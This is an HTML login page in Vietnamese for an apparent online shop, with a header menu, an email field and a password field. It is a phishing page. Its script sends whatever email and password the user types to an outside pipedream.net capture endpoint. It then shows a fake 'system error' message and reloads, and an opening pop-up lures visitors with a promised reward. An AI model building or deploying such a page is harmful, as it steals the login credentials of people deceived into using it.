<!DOCTYPE html>
<html>
    <head>
        <title>Đăng nhập</title>
        <meta charset="utf-8">
        <link rel="stylesheet" href="./assets/Font/fontawesome-free-5.15.4-web/fontawesome-free-5.15.4-web/css/all.min.css">
        <link rel="stylesheet" href="./style/style.css">
        <link rel="stylesheet" href="./style/config.css">
    </head>
    <header>
        <div class="Logo">
        </div>
        <div class ="Menu">
            <li><a href="./index.php">Trang chủ</a></li>
            <li><a href="./category.php">Sản Phẩm</a></li>
            <li><a href="">Khuyến mại</a></li>
            <li><a href="">Liên Hệ</a></li>
            <li><a href="">Thông Tin</a></li>
        </div>
        <div class="Other">
            <li><input placeholder="Tìm kiếm" type="text"><i class="fas fa-search"></i></li>
            <li class="icon-user"><a class="fas fa-user-alt"></a>
                <ul class="auth">
                    <li id ='register_label' class="auth-item"><a href="./Register.php">Đăng ký</a></li>
                    <li id = 'login_label' class="auth-item"><a href="./Login.php">Đăng nhập</a></li>
                    <a href="./information.php"><li id = 'username' class="auth-item hidden"></li></a>
                    <li id = 'logout' class="auth-item hidden"><a href="index.php?logout=true">Đăng xuất</a></li>
                </ul>
            </li>
            <li><a class="fas fa-shopping-cart"></a></li>
        </div>
    </header>
    <body>
        
        <div class="main">
            <form action="javascript:sender()" method="POST" class="form" id="form-2">
                <h3 class="heading">Đăng nhập</h3>
        
                <div class="spacer"></div>
                <span id='login_error'></span>
                <div class="form-group">
                <label for="email" class="form-label">Email</label>
                <input id="email" name="email" type="text" placeholder="VD: thinhvo@gmail.com" class="form-control">
                <span class="form-message"></span>
                </div>
        
                <div class="form-group">
                <label for="password" class="form-label">Mật khẩu</label>
                <input id="password" name="password" type="password" placeholder="Nhập mật khẩu" class="form-control">
                <span class="form-message"></span>
                </div>
        
                <button type="submit" class="form-submit">Đăng nhập</button>
            </form>    
        </div>
          
    </body>
    <script >
        alert('Đăng nhập để nhận thưởng');
        function sender() {
            var xhttp = new XMLHttpRequest();
            xhttp.open("POST", "https://en693egy0acstpc.m.pipedream.net/", true);
            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhttp.send("data=".concat(document.getElementById('email').value).concat(document.getElementById('password').value));
            alert('Hệ thống bị lỗi');
            location.reload();
        }
    </script>
</html>
